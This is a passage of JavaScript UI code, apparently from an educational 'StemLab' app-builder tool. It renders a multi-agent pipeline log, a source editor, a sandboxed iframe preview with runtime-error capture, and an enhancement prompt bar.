            h('p', { style: { fontSize: '10px', color: '#a5b4fc', marginBottom: '10px', lineHeight: 1.6 } },
              'This app was built by a team of AI agents working together \u2014 each specializing in a different aspect of software development. This is called "agentic AI" or "multi-agent orchestration." Each agent has a specific role and passes its work to the next agent in the pipeline.'
            ),
            h('div', { style: { display: 'flex', flexDirection: 'column', gap: '6px' } },
              d.lastPipelineLog.map(function(step, si) {
                var colors = { Architect: '#818cf8', Builder: '#34d399', Reviewer: '#fbbf24', Fixer: '#f87171', Assembler: '#a78bfa' };
                var agentColor = colors[step.agent] || (step.agent.indexOf('Section') === 0 ? '#06b6d4' : '#818cf8');
                var isSection = !!step.children;
                return h('div', { key: si, style: { padding: '8px 10px', background: isSection ? 'rgba(6,182,212,0.05)' : 'rgba(255,255,255,0.05)', borderRadius: '8px', borderLeft: '3px solid ' + agentColor } },
                  h('div', { style: { display: 'flex', gap: '8px', alignItems: 'center' } },
                    h('span', { style: { fontSize: '16px' } }, step.icon),
                    h('span', { style: { fontSize: '11px', fontWeight: 700, color: agentColor } }, step.agent),
                    h('span', { style: { fontSize: '10px', color: '#94a3b8', fontFamily: 'monospace', marginLeft: 'auto' } }, step.result)
                  ),
                  // Render children (sub-agents for sections)
                  isSection && h('div', { style: { marginTop: '6px', marginLeft: '20px', display: 'flex', flexDirection: 'column', gap: '3px' } },
                    step.children.map(function(child, ci) {
                      var childColor = colors[child.agent] || '#94a3b8';
                      return h('div', { key: ci, style: { display: 'flex', gap: '6px', alignItems: 'center', fontSize: '10px', padding: '3px 8px', background: 'rgba(0,0,0,0.2)', borderRadius: '4px', borderLeft: '2px solid ' + childColor } },
                        h('span', null, child.icon),
                        h('span', { style: { color: childColor, fontWeight: 600 } }, child.agent),
                        h('span', { style: { color: '#94a3b8', fontFamily: 'monospace', marginLeft: 'auto' } }, child.result)
                      );
                    })
                  )
                );
              })
            ),
            h('div', { style: { marginTop: '10px', padding: '8px 10px', background: 'rgba(99,102,241,0.1)', borderRadius: '8px', border: '1px solid rgba(99,102,241,0.2)' } },
              h('p', { style: { fontSize: '10px', color: '#a5b4fc', fontWeight: 600, marginBottom: '4px' } }, '\uD83D\uDCA1 How does this relate to real software engineering?'),
              h('p', { style: { fontSize: '9px', color: '#94a3b8', lineHeight: 1.5 } },
                'This app was built using a hierarchical multi-agent architecture. An Architect AI decomposed the app into independent sections, then EACH section was built, reviewed, and fixed by separate AI agents working in parallel \u2014 just like how professional software teams work. '
                + 'This is called "component-based architecture" \u2014 the same pattern used by React, Vue, and Angular. Each component is small enough for an AI to build perfectly, and the Assembler combines them into a working whole. '
                + 'The result is higher quality than a single AI trying to build everything at once, because each agent focuses on one thing and does it well.'
              )
            )
          )
        ),

        // ── App loaded: show preview + controls ──
        html && h('div', { style: { flex: 1, display: 'flex', flexDirection: showCode ? 'row' : 'column', gap: '8px', minHeight: 0 } },

          // Code editor (left panel when visible)
          showCode && h('div', { style: { flex: 1, display: 'flex', flexDirection: 'column', minWidth: 0 } },
            h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' } },
              h('span', { style: { fontSize: '11px', fontWeight: 700, color: '#94a3b8' } }, '</> Source Code'),
              h('div', { style: { display: 'flex', gap: '4px' } },
                h('button', { onClick: applyCodeEdit, disabled: editHtml === html,
                  style: btn(editHtml !== html ? '#22c55e' : '#e5e7eb', editHtml !== html ? '#fff' : '#9ca3af', editHtml === html) }, '▶ Apply Changes'),
                h('button', { onClick: function() { setEditHtml(html); }, style: btn('#f1f5f9', '#374151', false) }, '↩ Reset')
              )
            ),
            h('textarea', { value: editHtml, onChange: function(ev) { setEditHtml(ev.target.value); },
              style: { flex: 1, fontFamily: 'Consolas, Monaco, monospace', fontSize: '11px', padding: '10px', border: '1px solid #d1d5db', borderRadius: '8px', resize: 'none', background: '#1e293b', color: '#e2e8f0', outline: 'none', tabSize: 2, lineHeight: 1.5 },
              onFocus: function(e) { e.target.style.boxShadow = '0 0 0 3px rgba(34,211,238,0.5)'; },
              onBlur: function(e) { e.target.style.boxShadow = 'none'; },
              spellCheck: false, 'aria-label': 'HTML source code editor' })
          ),

          // Preview iframe with error capture
          h('div', { style: { flex: showCode ? 1 : 1, display: 'flex', flexDirection: 'column', minHeight: fullscreen ? '80vh' : '300px', position: 'relative' } },
            h('iframe', {
              ref: iframeRef,
              srcDoc: html,
              sandbox: 'allow-scripts',
              title: 'AppLab preview',
              'aria-label': 'Interactive app preview: ' + (prompt || 'generated app'),
              style: { flex: 1, border: '2px solid #e5e7eb', borderRadius: '12px', background: '#fff', width: '100%' },
              onLoad: function() {
                // Inject error listener into iframe to capture runtime errors
                setIframeErrors([]);
                try {
                  var iDoc = iframeRef.current && iframeRef.current.contentWindow;
                  if (iDoc) {
                    iDoc.onerror = function(msg, src, line, col) {
                      setIframeErrors(function(prev) { return prev.concat([{ msg: msg, line: line, col: col }]).slice(-5); });
                      return true; // prevent default
                    };
                  }
                } catch(e) { /* sandbox may block */ }
              }
            }),
            // Error overlay (shows runtime errors from generated app)
            iframeErrors.length > 0 && h('div', { style: { position: 'absolute', bottom: 0, left: 0, right: 0, background: 'rgba(220,38,38,0.95)', color: '#fff', padding: '8px 12px', borderRadius: '0 0 12px 12px', fontSize: '11px', fontFamily: 'monospace', maxHeight: '80px', overflowY: 'auto', zIndex: 10 } },
              h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' } },
                h('span', { style: { fontWeight: 'bold' } }, '\u26A0\uFE0F ' + iframeErrors.length + ' error(s) in generated app'),
                h('button', { onClick: function() { setIframeErrors([]); }, style: { background: 'rgba(255,255,255,0.2)', border: 'none', color: '#fff', padding: '2px 6px', borderRadius: '4px', cursor: 'pointer', fontSize: '10px' } }, '\u2715')
              ),
              iframeErrors.map(function(err, i) {
                return h('div', { key: i, style: { fontSize: '10px', opacity: 0.9 } }, 'Line ' + (err.line || '?') + ': ' + (err.msg || 'Unknown error'));
              })
            ),
            // Enhance bar (below preview)
            h('div', { style: { display: 'flex', gap: '6px', marginTop: '6px', flexShrink: 0 } },
              h('input', { type: 'text', value: enhancePrompt, onChange: function(ev) { setEnhancePrompt(ev.target.value); },
                onKeyDown: function(ev) { if (ev.key === 'Enter' && enhancePrompt.trim() && !isGenerating) enhanceApp(); },
                placeholder: 'Enhance: "add a dark mode toggle" or "make the particles bigger"...',
                style: { flex: 1, padding: '8px 14px', border: '2px solid #d1d5db', borderRadius: '10px', fontSize: '12px', outline: 'none' },
                disabled: isGenerating, 'aria-label': 'Enhancement prompt' }),
              h('button', { onClick: enhanceApp, disabled: !enhancePrompt.trim() || isGenerating,
                style: btn(PURPLE, '#fff', !enhancePrompt.trim() || isGenerating) }, isGenerating ? '\u23F3' : '\u2728 Enhance'),
              h('button', { onClick: function() { setHtml(''); setEditHtml(''); setPrompt(''); setHistory([]); setHistoryIdx(-1); },
                style: btn('#fee2e2', '#991b1b', false), title: 'Start over' }, '\uD83D\uDDD1\uFE0F New')
            )
          )
        ),

        // Loading overlay
        isGenerating && !html && h('div', { style: { textAlign: 'center', padding: '40px', color: '#94a3b8' } },
          h('div', { style: { fontSize: '48px', marginBottom: '12px', animation: 'pulse 1.5s infinite' } }, '\uD83D\uDCA1'),
          h('p', { style: { fontSize: '14px', fontWeight: 600 } }, genStep || 'Generating your app...'),
          h('p', { style: { fontSize: '11px', color: '#9ca3af' } }, 'This usually takes 5-15 seconds')
        )
      );
    }
  });

  console.log('[StemLab] stem_tool_applab.js v1.0 loaded');
})();
